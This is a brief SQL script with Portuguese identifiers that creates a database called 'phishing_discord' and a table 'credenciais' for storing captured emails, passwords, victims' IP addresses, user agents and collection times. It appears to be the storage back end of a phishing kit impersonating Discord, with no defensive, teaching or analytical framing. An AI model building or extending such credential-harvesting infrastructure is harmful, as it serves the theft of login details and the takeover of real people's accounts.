CREATE DATABASE phishing_discord;

USE phishing_discord;

CREATE TABLE credenciais (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255),
    senha VARCHAR(255),
    ip VARCHAR(45),
    user_agent TEXT,
    data_coleta DATETIME DEFAULT CURRENT_TIMESTAMP
);